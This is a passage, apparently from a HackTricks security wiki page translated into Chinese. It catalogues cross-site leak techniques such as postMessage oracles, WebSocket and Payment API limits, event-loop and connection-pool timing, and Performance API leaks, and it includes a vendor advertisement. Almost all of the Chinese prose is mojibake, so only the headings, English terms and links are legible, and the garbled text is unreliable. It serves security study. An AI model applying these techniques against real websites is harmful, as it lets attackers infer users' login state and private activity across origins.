å¯ä»¥**åŠ è½½ä¸€ä¸ªé¡µé¢**åˆ°ä¸€ä¸ª**iframe**ä¸­ï¼Œå¹¶ä½¿ç”¨\*\*`#id_value`**ä½¿é¡µé¢**èšç„¦**åœ¨iframeä¸­æŒ‡å®šçš„å…ƒç´ ä¸Šï¼Œç„¶åå¦‚æœè§¦å‘äº†**`onblur`**ä¿¡å·ï¼Œåˆ™IDå…ƒç´ å­˜åœ¨ã€‚**\
**æ‚¨å¯ä»¥ä½¿ç”¨**`portal`\*\*æ ‡ç­¾æ‰§è¡Œç›¸åŒçš„æ”»å‡»ã€‚

### postMessageå¹¿æ’­ <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: APIä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **æ‘˜è¦**: ä»postMessageä¸­æ”¶é›†æ•æ„Ÿä¿¡æ¯æˆ–ä½¿ç”¨postMessagesçš„å­˜åœ¨ä½œä¸ºä¸€ä¸ªé¢„è¨€æœºæ¥äº†è§£ç”¨æˆ·åœ¨é¡µé¢ä¸­çš„çŠ¶æ€
* **ä»£ç ç¤ºä¾‹**: `ä»»ä½•ç›‘å¬æ‰€æœ‰postMessagesçš„ä»£ç ã€‚`

åº”ç”¨ç¨‹åºç»å¸¸ä½¿ç”¨[`postMessage`å¹¿æ’­](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)åœ¨ä¸åŒæºä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚ç„¶è€Œï¼Œå¦‚æœæœªæ­£ç¡®æŒ‡å®š`targetOrigin`å‚æ•°ï¼Œæ­¤æ–¹æ³•å¯èƒ½æ— æ„ä¸­æš´éœ²**æ•æ„Ÿä¿¡æ¯**ï¼Œå…è®¸ä»»ä½•çª—å£æ¥æ”¶æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œæ¥æ”¶æ¶ˆæ¯æœ¬èº«å¯ä»¥å……å½“ä¸€ä¸ª**é¢„è¨€æœº**ï¼›ä¾‹å¦‚ï¼ŒæŸäº›æ¶ˆæ¯å¯èƒ½ä»…å‘é€ç»™å·²ç™»å½•çš„ç”¨æˆ·ã€‚å› æ­¤ï¼Œè¿™äº›æ¶ˆæ¯çš„å­˜åœ¨æˆ–ä¸å­˜åœ¨å¯ä»¥æ­ç¤ºæœ‰å…³ç”¨æˆ·çŠ¶æ€æˆ–èº«ä»½çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ä»–ä»¬æ˜¯å¦å·²ç»è®¤è¯ã€‚

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## å…¨å±€é™åˆ¶æŠ€æœ¯

### WebSocket API

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: APIä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **æ‘˜è¦**: è€—å°½WebSocketè¿æ¥é™åˆ¶ä¼šæ³„æ¼è·¨æºé¡µé¢çš„WebSocketè¿æ¥æ•°é‡ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

å¯ä»¥ç¡®å®šç›®æ ‡é¡µé¢ä½¿ç”¨äº†å¤šå°‘**WebSocketè¿æ¥**ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥æ£€æµ‹åº”ç”¨ç¨‹åºçŠ¶æ€å¹¶æ³„æ¼ä¸WebSocketè¿æ¥æ•°é‡ç›¸å…³çš„ä¿¡æ¯ã€‚

å¦‚æœä¸€ä¸ª**æº**ä½¿ç”¨äº†**æœ€å¤§æ•°é‡çš„WebSocket**è¿æ¥å¯¹è±¡ï¼Œæ— è®ºå®ƒä»¬çš„è¿æ¥çŠ¶æ€å¦‚ä½•ï¼Œåˆ›å»º**æ–°å¯¹è±¡**å°†å¯¼è‡´JavaScriptå¼‚å¸¸ã€‚ä¸ºæ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ”»å‡»è€…ç½‘ç«™åœ¨å¼¹å‡ºçª—å£æˆ–iframeä¸­æ‰“å¼€ç›®æ ‡ç½‘ç«™ï¼Œç„¶ååœ¨ç›®æ ‡ç½‘ç«™åŠ è½½å®Œæˆåï¼Œå°è¯•åˆ›å»ºå°½å¯èƒ½å¤šçš„WebSocketè¿æ¥ã€‚æŠ›å‡ºçš„**å¼‚å¸¸æ•°é‡**å°±æ˜¯ç›®æ ‡ç½‘ç«™çª—å£ä½¿ç”¨çš„**WebSocketè¿æ¥æ•°é‡**ã€‚

### æ”¯ä»˜ API

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: API ä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **æ‘˜è¦**: æ£€æµ‹æ”¯ä»˜è¯·æ±‚ï¼Œå› ä¸ºä¸€æ¬¡åªèƒ½æœ‰ä¸€ä¸ªæ¿€æ´»ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

è¿™ç§ XS-Leak ä½¿æ”»å‡»è€…èƒ½å¤Ÿ**æ£€æµ‹è·¨æºé¡µé¢å‘èµ·æ”¯ä»˜è¯·æ±‚**ã€‚

å› ä¸º**ä¸€æ¬¡åªèƒ½æœ‰ä¸€ä¸ªè¯·æ±‚æ”¯ä»˜å¤„äºæ´»åŠ¨çŠ¶æ€**ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™æ­£åœ¨ä½¿ç”¨æ”¯ä»˜è¯·æ±‚ APIï¼Œä»»ä½•**è¿›ä¸€æ­¥å°è¯•ä½¿ç”¨æ­¤ API çš„å°è¯•éƒ½å°†å¤±è´¥**ï¼Œå¹¶å¯¼è‡´**JavaScript å¼‚å¸¸**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡**å®šæœŸå°è¯•æ˜¾ç¤ºæ”¯ä»˜ API UI**æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚å¦‚æœä¸€æ¬¡å°è¯•å¯¼è‡´å¼‚å¸¸ï¼Œè¡¨ç¤ºç›®æ ‡ç½‘ç«™å½“å‰æ­£åœ¨ä½¿ç”¨å®ƒã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨åˆ›å»ºåç«‹å³å…³é—­ UI æ¥éšè—è¿™äº›å®šæœŸå°è¯•ã€‚

### è®¡æ—¶äº‹ä»¶å¾ªç¯ <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **åŒ…å«æ–¹æ³•**:
* **å¯æ£€æµ‹å·®å¼‚**: è®¡æ—¶ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **æ‘˜è¦**: æµ‹é‡æ»¥ç”¨å•çº¿ç¨‹ JS äº‹ä»¶å¾ªç¯çš„ç½‘é¡µæ‰§è¡Œæ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript åœ¨[å•çº¿ç¨‹äº‹ä»¶å¾ªç¯](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop)å¹¶å‘æ¨¡å‹ä¸Šè¿è¡Œï¼Œè¿™æ„å‘³ç€**ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªä»»åŠ¡**ã€‚è¿™ä¸ªç‰¹æ€§å¯ä»¥è¢«åˆ©ç”¨æ¥è¡¡é‡**æ¥è‡ªä¸åŒæºçš„ä»£ç æ‰§è¡Œæ‰€éœ€çš„æ—¶é—´**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿ç»­åˆ†æ´¾å…·æœ‰å›ºå®šå±æ€§çš„äº‹ä»¶æ¥æµ‹é‡ä»–ä»¬è‡ªå·±ä»£ç åœ¨äº‹ä»¶å¾ªç¯ä¸­çš„æ‰§è¡Œæ—¶é—´ã€‚è¿™äº›äº‹ä»¶å°†åœ¨äº‹ä»¶æ± ä¸ºç©ºæ—¶è¢«å¤„ç†ã€‚å¦‚æœå…¶ä»–æºä¹Ÿå°†äº‹ä»¶åˆ†æ´¾åˆ°ç›¸åŒçš„æ± ä¸­ï¼Œ**æ”»å‡»è€…å¯ä»¥é€šè¿‡è§‚å¯Ÿè‡ªå·±ä»»åŠ¡æ‰§è¡Œçš„å»¶è¿Ÿæ¥æ¨æ–­å¤–éƒ¨äº‹ä»¶æ‰§è¡Œæ‰€éœ€çš„æ—¶é—´**ã€‚é€šè¿‡ç›‘è§†äº‹ä»¶å¾ªç¯ä¸­çš„å»¶è¿Ÿæ¥æ£€æµ‹å»¶è¿Ÿï¼Œå¯ä»¥æ­ç¤ºæ¥è‡ªä¸åŒæºçš„ä»£ç çš„æ‰§è¡Œæ—¶é—´ï¼Œå¯èƒ½æš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œè®¡æ—¶ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤** **ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡**ã€‚ä¾‹å¦‚ï¼Œåœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### ç¹å¿™äº‹ä»¶å¾ªç¯ <a href="#busy-event-loop" id="busy-event-loop"></a>

* **åŒ…å«æ–¹æ³•**:
* **å¯æ£€æµ‹å·®å¼‚**: è®¡æ—¶ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **æ‘˜è¦**: ä¸€ç§æµ‹é‡ç½‘é¡µæ“ä½œæ‰§è¡Œæ—¶é—´çš„æ–¹æ³•æ˜¯æ•…æ„é˜»å¡çº¿ç¨‹çš„äº‹ä»¶å¾ªç¯ï¼Œç„¶åè®¡æ—¶**äº‹ä»¶å¾ªç¯å†æ¬¡å¯ç”¨æ‰€éœ€çš„æ—¶é—´**ã€‚é€šè¿‡åœ¨äº‹ä»¶å¾ªç¯ä¸­æ’å…¥é˜»å¡æ“ä½œï¼ˆå¦‚é•¿æ—¶é—´è®¡ç®—æˆ–åŒæ­¥ API è°ƒç”¨ï¼‰ï¼Œå¹¶ç›‘è§†åç»­ä»£ç å¼€å§‹æ‰§è¡Œæ‰€éœ€çš„æ—¶é—´ï¼Œå¯ä»¥æ¨æ–­åœ¨é˜»å¡æœŸé—´æ‰§è¡Œçš„ä»»åŠ¡çš„æŒç»­æ—¶é—´ã€‚è¿™ç§æŠ€æœ¯åˆ©ç”¨äº† JavaScript äº‹ä»¶å¾ªç¯çš„å•çº¿ç¨‹ç‰¹æ€§ï¼Œå…¶ä¸­ä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œï¼Œå¹¶å¯ä»¥æä¾›å…³äºå…±äº«ç›¸åŒçº¿ç¨‹çš„å…¶ä»–æ“ä½œçš„æ€§èƒ½æˆ–è¡Œä¸ºçš„è§è§£ã€‚
* **ä»£ç ç¤ºä¾‹**:

é€šè¿‡é”å®šäº‹ä»¶å¾ªç¯æ¥æµ‹é‡æ‰§è¡Œæ—¶é—´çš„æŠ€æœ¯çš„ä¸€ä¸ªé‡è¦ä¼˜åŠ¿æ˜¯å…¶æ½œåŠ›å¯ä»¥è§„é¿**ç«™ç‚¹éš”ç¦»**ã€‚**ç«™ç‚¹éš”ç¦»**æ˜¯ä¸€ç§å®‰å…¨åŠŸèƒ½ï¼Œå°†ä¸åŒç½‘ç«™åˆ†éš”åˆ°å•ç‹¬çš„è¿›ç¨‹ä¸­ï¼Œæ—¨åœ¨é˜²æ­¢æ¶æ„ç½‘ç«™ç›´æ¥è®¿é—®å…¶ä»–ç½‘ç«™çš„æ•æ„Ÿæ•°æ®ã€‚ç„¶è€Œï¼Œé€šè¿‡å½±å“é€šè¿‡å…±äº«äº‹ä»¶å¾ªç¯å¯¹å¦ä¸€ä¸ªæºçš„æ‰§è¡Œæ—¶é—´ï¼Œæ”»å‡»è€…å¯ä»¥é—´æ¥æå–å…³äºè¯¥æºæ´»åŠ¨çš„ä¿¡æ¯ã€‚è¿™ç§æ–¹æ³•ä¸ä¾èµ–äºç›´æ¥è®¿é—®å…¶ä»–æºæ•°æ®ï¼Œè€Œæ˜¯è§‚å¯Ÿè¯¥æºæ´»åŠ¨å¯¹å…±äº«äº‹ä»¶å¾ªç¯çš„å½±å“ï¼Œä»è€Œè§„é¿äº†**ç«™ç‚¹éš”ç¦»**å»ºç«‹çš„ä¿æŠ¤å±éšœã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œè®¡æ—¶ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤** **ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡**ã€‚ä¾‹å¦‚ï¼Œåœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### è¿æ¥æ± 

* **åŒ…å«æ–¹æ³•**: JavaScript è¯·æ±‚
* **å¯æ£€æµ‹å·®å¼‚**: è®¡æ—¶ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **æ‘˜è¦**: æ”»å‡»è€…å¯ä»¥é”å®šé™¤ 1 ä¹‹å¤–çš„æ‰€æœ‰å¥—æ¥å­—ï¼ŒåŠ è½½ç›®æ ‡ç½‘é¡µï¼ŒåŒæ—¶åŠ è½½å¦ä¸€é¡µï¼Œç›´åˆ°æœ€åä¸€é¡µå¼€å§‹åŠ è½½çš„æ—¶é—´æ˜¯ç›®æ ‡é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

æµè§ˆå™¨åˆ©ç”¨å¥—æ¥å­—è¿›è¡ŒæœåŠ¡å™¨é€šä¿¡ï¼Œä½†ç”±äºæ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶èµ„æºæœ‰é™ï¼Œ**æµè§ˆå™¨è¢«è¿«å¯¹å¹¶å‘å¥—æ¥å­—æ•°é‡æ–½åŠ é™åˆ¶**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨è¿™ç§é™åˆ¶ï¼š

1. ç¡®å®šæµè§ˆå™¨çš„å¥—æ¥å­—é™åˆ¶ï¼Œä¾‹å¦‚ï¼Œ256 ä¸ªå…¨å±€å¥—æ¥å­—ã€‚
2. é€šè¿‡å‘å„ä¸ªä¸»æœºå‘èµ· 255 ä¸ªè¯·æ±‚æ¥å ç”¨ 255 ä¸ªå¥—æ¥å­—ä¸€æ®µæ—¶é—´ï¼Œè¿™äº›è¯·æ±‚æ—¨åœ¨ä¿æŒè¿æ¥æ‰“å¼€è€Œä¸å®Œæˆã€‚
3. ä½¿ç”¨ç¬¬ 256 ä¸ªå¥—æ¥å­—å‘ç›®æ ‡é¡µé¢å‘é€è¯·æ±‚ã€‚
4. å°è¯•å‘å¦ä¸€ä¸ªä¸»æœºå‘é€ç¬¬ 257 ä¸ªè¯·æ±‚ã€‚ç”±äºæ‰€æœ‰å¥—æ¥å­—éƒ½åœ¨ä½¿ç”¨ä¸­ï¼ˆæ ¹æ®æ­¥éª¤ 2 å’Œ 3ï¼‰ï¼Œæ­¤è¯·æ±‚å°†æ’é˜Ÿç­‰å¾…ï¼Œç›´åˆ°å¥—æ¥å­—å¯ç”¨ã€‚åœ¨æ­¤è¯·æ±‚ç»§ç»­ä¹‹å‰çš„å»¶è¿Ÿä¸ºæ”»å‡»è€…æä¾›äº†æœ‰å…³ä¸ç¬¬ 256 ä¸ªå¥—æ¥å­—ç›¸å…³çš„ç½‘ç»œæ´»åŠ¨çš„æ—¶é—´ä¿¡æ¯ï¼ˆç›®æ ‡é¡µé¢çš„å¥—æ¥å­—ï¼‰ã€‚è¿™ç§æ¨æ–­æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºæ­¥éª¤ 2 ä¸­çš„ 255 ä¸ªå¥—æ¥å­—ä»åœ¨ä½¿ç”¨ä¸­ï¼Œè¿™æ„å‘³ç€ä»»ä½•æ–°å¯ç”¨çš„å¥—æ¥å­—å¿…é¡»æ˜¯ä»æ­¥éª¤ 3 é‡Šæ”¾çš„å¥—æ¥å­—ã€‚ç¬¬ 256 ä¸ªå¥—æ¥å­—å˜ä¸ºå¯ç”¨æ‰€éœ€çš„æ—¶é—´ç›´æ¥ä¸è¯·æ±‚å®Œæˆç›®æ ‡é¡µé¢æ‰€éœ€çš„æ—¶é—´ç›¸å…³è”ã€‚

äº†è§£æ›´å¤šä¿¡æ¯ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### æŒ‰ç›®æ ‡çš„è¿æ¥æ± 

* **åŒ…å«æ–¹æ³•**: JavaScript è¯·æ±‚
* **å¯æ£€æµ‹å·®å¼‚**: è®¡æ—¶ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**:
* **æ‘˜è¦**: è¿™ç±»ä¼¼äºå‰ä¸€ç§æŠ€æœ¯ï¼Œä½†ä¸æ˜¯ä½¿ç”¨æ‰€æœ‰å¥—æ¥å­—ï¼ŒGoogle **Chrome** å°†åŒä¸€æºçš„**å¹¶å‘è¯·æ±‚é™åˆ¶ä¸º 6 ä¸ª**ã€‚å¦‚æœæˆ‘ä»¬**é˜»å¡ 5 ä¸ª**ï¼Œç„¶å**å‘èµ·ç¬¬ 6 ä¸ª**è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥**è®¡æ—¶**å®ƒï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•ä½¿**å—å®³é¡µé¢å‘é€**æ›´å¤š**è¯·æ±‚**åˆ°åŒä¸€ç«¯ç‚¹ä»¥æ£€æµ‹**é¡µé¢çš„çŠ¶æ€**ï¼Œ**ç¬¬ 6 ä¸ªè¯·æ±‚**å°†**èŠ±è´¹æ›´é•¿æ—¶é—´**ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹åˆ°ã€‚

## æ€§èƒ½APIæŠ€æœ¯

[`æ€§èƒ½API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) æä¾›äº†å¯¹Webåº”ç”¨æ€§èƒ½æŒ‡æ ‡çš„æ´å¯Ÿï¼Œè¿›ä¸€æ­¥ç”±[`èµ„æºå®šæ—¶API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API)ä¸°å¯Œã€‚èµ„æºå®šæ—¶APIä½¿å¾—ç›‘æ§è¯¦ç»†çš„ç½‘ç»œè¯·æ±‚æ—¶é—´æˆä¸ºå¯èƒ½ï¼Œä¾‹å¦‚è¯·æ±‚çš„æŒç»­æ—¶é—´ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“æœåŠ¡å™¨åœ¨å…¶å“åº”ä¸­åŒ…å« `Timing-Allow-Origin: *` å¤´æ—¶ï¼Œé¢å¤–çš„æ•°æ®å¦‚ä¼ è¾“å¤§å°å’ŒåŸŸæŸ¥æ‰¾æ—¶é—´å˜å¾—å¯ç”¨ã€‚

è¿™äº›ä¸°å¯Œçš„æ•°æ®å¯ä»¥é€šè¿‡è¯¸å¦‚[`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries)æˆ–[`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName)ç­‰æ–¹æ³•æ£€ç´¢ï¼Œæä¾›äº†æ€§èƒ½ç›¸å…³ä¿¡æ¯çš„å…¨é¢è§†å›¾ã€‚æ­¤å¤–ï¼Œè¯¥APIé€šè¿‡è®¡ç®—ä»[`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)è·å¾—çš„æ—¶é—´æˆ³ä¹‹é—´çš„å·®å¼‚ï¼Œä¾¿äºæµ‹é‡æ‰§è¡Œæ—¶é—´ã€‚ç„¶è€Œï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºChromeç­‰æµè§ˆå™¨ä¸­çš„æŸäº›æ“ä½œï¼Œ`performance.now()` çš„ç²¾åº¦å¯èƒ½ä»…é™äºæ¯«ç§’ï¼Œè¿™å¯èƒ½ä¼šå½±å“æ—¶é—´æµ‹é‡çš„ç²’åº¦ã€‚

é™¤äº†æ—¶é—´æµ‹é‡ä¹‹å¤–ï¼Œæ€§èƒ½APIè¿˜å¯ç”¨äºå®‰å…¨ç›¸å…³æ´å¯Ÿã€‚ä¾‹å¦‚ï¼Œåœ¨Chromeä¸­ï¼Œ`performance` å¯¹è±¡ä¸­é¡µé¢çš„å­˜åœ¨æˆ–ä¸å­˜åœ¨å¯ä»¥æŒ‡ç¤º `X-Frame-Options` çš„åº”ç”¨ã€‚å…·ä½“æ¥è¯´ï¼Œå¦‚æœç”±äº `X-Frame-Options` è€Œé˜»æ­¢é¡µé¢åœ¨æ¡†æ¶ä¸­å‘ˆç°ï¼Œåˆ™è¯¥é¡µé¢å°†ä¸ä¼šè®°å½•åœ¨ `performance` å¯¹è±¡ä¸­ï¼Œä¸ºé¡µé¢çš„æ¡†æ¶ç­–ç•¥æä¾›äº†å¾®å¦™çš„çº¿ç´¢ã€‚

### é”™è¯¯æ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼ŒHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šå¯¼è‡´é”™è¯¯çš„è¯·æ±‚ä¸ä¼šåˆ›å»ºèµ„æºå®šæ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

å¯ä»¥**åŒºåˆ†HTTPå“åº”çŠ¶æ€ç **ï¼Œå› ä¸ºå¯¼è‡´**é”™è¯¯**çš„è¯·æ±‚**ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚

### æ ·å¼é‡æ–°åŠ è½½é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šç”±äºæµè§ˆå™¨é”™è¯¯ï¼Œå¯¼è‡´é”™è¯¯çš„è¯·æ±‚åŠ è½½ä¸¤æ¬¡ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

åœ¨å…ˆå‰çš„æŠ€æœ¯ä¸­ï¼Œè¿˜ç¡®å®šäº†ä¸¤ç§æƒ…å†µï¼Œå³æµè§ˆå™¨ä¸­GCçš„é”™è¯¯å¯¼è‡´**åŠ è½½å¤±è´¥æ—¶èµ„æºåŠ è½½ä¸¤æ¬¡**ã€‚è¿™å°†å¯¼è‡´æ€§èƒ½APIä¸­çš„å¤šä¸ªæ¡ç›®ï¼Œå¹¶å› æ­¤å¯ä»¥è¢«æ£€æµ‹åˆ°ã€‚

### è¯·æ±‚åˆå¹¶é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šå¯¼è‡´é”™è¯¯çš„è¯·æ±‚æ— æ³•åˆå¹¶ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

åœ¨æåˆ°çš„è®ºæ–‡ä¸­æ‰¾åˆ°äº†è¿™ç§æŠ€æœ¯ï¼Œä½†æ²¡æœ‰æ‰¾åˆ°å…³äºè¯¥æŠ€æœ¯çš„æè¿°ã€‚ç„¶è€Œï¼Œæ‚¨å¯ä»¥åœ¨[https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)ä¸­æ‰¾åˆ°æ£€æŸ¥å®ƒçš„æºä»£ç ã€‚

### ç©ºç™½é¡µé¢æ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šç©ºç™½å“åº”ä¸ä¼šåˆ›å»ºèµ„æºå®šæ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

æ”»å‡»è€…å¯ä»¥æ£€æµ‹è¯·æ±‚æ˜¯å¦å¯¼è‡´ç©ºçš„HTTPå“åº”ä¸»ä½“ï¼Œå› ä¸º**æŸäº›æµè§ˆå™¨ä¸­çš„ç©ºç™½é¡µé¢ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚

### **XSSå®¡è®¡æ³„æ¼**

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šä½¿ç”¨å®‰å…¨æ–­è¨€ä¸­çš„XSSå®¡è®¡ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è§‚å¯Ÿå½“ç²¾å¿ƒåˆ¶ä½œçš„æœ‰æ•ˆè´Ÿè½½è§¦å‘å®¡è®¡è¿‡æ»¤æœºåˆ¶æ—¶å“åº”ä¸­çš„å˜åŒ–ï¼Œæ£€æµ‹ç‰¹å®šç½‘é¡µå…ƒç´ ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

